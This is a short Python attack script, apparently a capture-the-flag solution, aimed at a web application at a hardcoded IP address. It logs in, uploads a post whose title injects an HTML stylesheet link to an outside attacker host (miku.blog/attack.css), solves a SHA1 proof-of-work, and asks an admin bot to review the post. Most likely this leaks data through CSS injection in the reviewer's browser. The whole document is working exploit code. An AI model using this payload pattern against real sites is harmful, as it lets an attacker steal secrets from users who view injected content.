import requests
import hashlib
import time

s = requests.Session()


def pow(hash):
	i = 0
	while True:
		if hashlib.sha1(str(i).encode()).hexdigest()[:5] == hash:
			return i
		i += 1

HOST = 'http://3.35.121.198:40831'

# create php session
s.get(HOST + '/index.php')
print('Cookie :', s.cookies)

# login
data = {
	'userid': 'test0198234',
	'pw': 'test0198234'
}

s.post(f'{HOST}/login.php', data=data)

# upload
data = {
	'title': '<link rel="stylesheet" href="http://miku.blog/attack.css">',
	'category': 'temp',
	'abstract': 'asdf'
}
r = s.post(f'{HOST}/upload.php', data=data)

path = r.text.split('">here')[0].split('./')[-1]
pid = path.split('id=')[1]

print('path :', path)
print('pid :', pid)

# get pow
r = s.get(f'{HOST}/{path}')
hash = r.text.split(' == \'')[1].split("'")[0]
answer = pow(hash)

print('pow :', hash)
print('answer :', answer)


data = {
  'pow': answer,
  'pid': pid
}

# request review
r = s.post(f'{HOST}/{path}',  data=data, verify=False)
print(r.text)
